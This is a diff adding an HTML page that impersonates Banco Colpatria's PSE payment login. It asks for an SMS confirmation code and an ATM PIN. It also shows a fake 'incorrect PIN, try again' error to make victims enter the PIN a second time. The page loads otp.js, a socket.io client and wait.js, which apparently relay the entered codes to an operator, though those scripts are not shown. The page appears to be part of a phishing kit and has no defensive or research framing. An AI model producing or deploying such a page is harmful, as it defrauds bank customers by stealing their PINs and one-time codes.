@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="../../../js/functions.js"></script>
+    <title>Colpatria</title>
+
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        font-family: "Poppins", sans-serif;
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      header {
+        height: 10vh;
+        border-top: #e40001 5px solid;
+        box-shadow: 0 2px 3px #bbbbbb;
+        padding: 2px 10px;
+      }
+      section {
+        margin: auto;
+        max-width: 500px;
+      }
+      input {
+        color: #5c5c5c;
+      }
+      button {
+        color: #fff;
+        width: 100%;
+        border-radius: 10px;
+        background-color: #e40001;
+        border: none;
+        padding: 10px;
+        font-weight: 600;
+      }
+      p {
+        color: #5c5c5c;
+        width: 100%;
+        text-align: center;
+        padding: 15px 50px;
+      }
+      #underline_red {
+        border-bottom: 2px solid #e40001;
+        border-radius: 5px;
+        width: 2rem;
+      }
+      #title {
+        margin: 20px 0;
+      }
+      h2 {
+        font-size: 20px;
+        width: 100%;
+        text-align: center;
+        margin: 20px 0;
+      }
+
+      .input-container {
+        position: relative;
+        width: 100%;
+        margin-bottom: 20px;
+        margin-top: 20px;
+        display: flex;
+        align-items: center;
+      }
+
+      .input-container svg {
+        height: 25px; /* Ajusta el alto del ícono */
+        width: 25px;
+        fill: gray; /* Color del ícono */
+        margin-right: 10px; /* Espaciado entre ícono e input */
+      }
+
+      .input-container input {
+        flex: 1; /* Hace que el input ocupe el espacio restante */
+        padding: 10px;
+        border: none;
+        border-bottom: 2px solid gray;
+        border-radius: 10px;
+        font-size: 16px;
+        outline: none;
+        appearance: none;
+        -moz-appearance: textfield;
+        transition: border-color 0.3s ease, padding-top 0.3s ease;
+      }
+
+      .input-container input:focus {
+        border-bottom-color: darkslateblue;
+      }
+
+      .input-container input::placeholder {
+        color: gray;
+      }
+
+      .input-container input:focus::placeholder {
+        color: gray;
+      }
+
+      .input-container label {
+        position: absolute;
+        left: 40px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: gray;
+        font-size: 16px;
+        pointer-events: none;
+        transition: all 0.3s ease;
+      }
+
+      .input-container input:focus + label,
+      .input-container input:not(:placeholder-shown) + label {
+        top: -10px;
+        font-size: 12px;
+        color: black;
+      }
+
+      .input-container input::-webkit-outer-spin-button,
+      .input-container input::-webkit-inner-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
+      }
+    </style>
+  </head>
+
+  <body>
+    <header>
+      <img src="logo.crop.png" alt="Logo banco colpatria" height="100%" />
+    </header>
+
+    <section>
+      <div id="title">
+        <h1>Ingresa a pagos PSE</h1>
+        <div id="underline_red"></div>
+      </div>
+
+      <h2>Se necesita validar identidad</h2>
+
+      <p>
+        Ingrese código de confirmación enviado por mensaje de texto y/o SMS.
+      </p>
+      <p style="color: #e40001">
+        Error al ingresar la clave de cajero, por favor intente de nuevo.
+      </p>
+      <!-- Código de confirmación -->
+      <div class="input-container">
+        <svg
+          xmlns="http://www.w3.org/2000/svg"
+          width="24"
+          height="24"
+          viewBox="0 0 24 24"
+        >
+          <path
+            d="M17 2H7c-1.103 0-2 .897-2 2v16c0 1.103.897 2 2 2h10c1.103 0 2-.897 2-2V4c0-1.103-.897-2-2-2zM7 16.999V5h10l.002 11.999H7z"
+          />
+        </svg>
+        <input type="number" placeholder=" " id="confirmation-code" />
+        <label for="confirmation-code">Código de confirmación</label>
+      </div>
+
+      <p>Para confirmar ingrese clave de cajero.</p>
+      <!-- Clave de cajero -->
+      <div class="input-container">
+        <svg
+          xmlns="http://www.w3.org/2000/svg"
+          width="24"
+          height="24"
+          viewBox="0 0 24 24"
+        >
+          <path
+            d="M12 2C9.243 2 7 4.243 7 7v2H6c-1.103 0-2 .897-2 2v9c0 1.103.897 2 2 2h12c1.103 0 2-.897 2-2v-9c0-1.103-.897-2-2-2h-1V7c0-2.757-2.243-5-5-5zM9 7c0-1.654 1.346-3 3-3s3 1.346 3 3v2H9V7zm9.002 13H13v-2.278c.595-.347 1-.985 1-1.722 0-1.103-.897-2-2-2s-2 .897-2 2c0 .736.405 1.375 1 1.722V20H6v-9h12l.002 9z"
+          />
+        </svg>
+        <input type="number" id="txtdinamica" />
+        <label for="txtdinamica">Clave de cajero</label>
+      </div>
+
+      <button type="submit" name="clave" id="btnDinamica" value="Ingresar">
+        Ingresar
+      </button>
+    </section>
+
+    <script src="js/otp.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
+    <script src="js/wait.js"></script>
+  </body>
+</html>
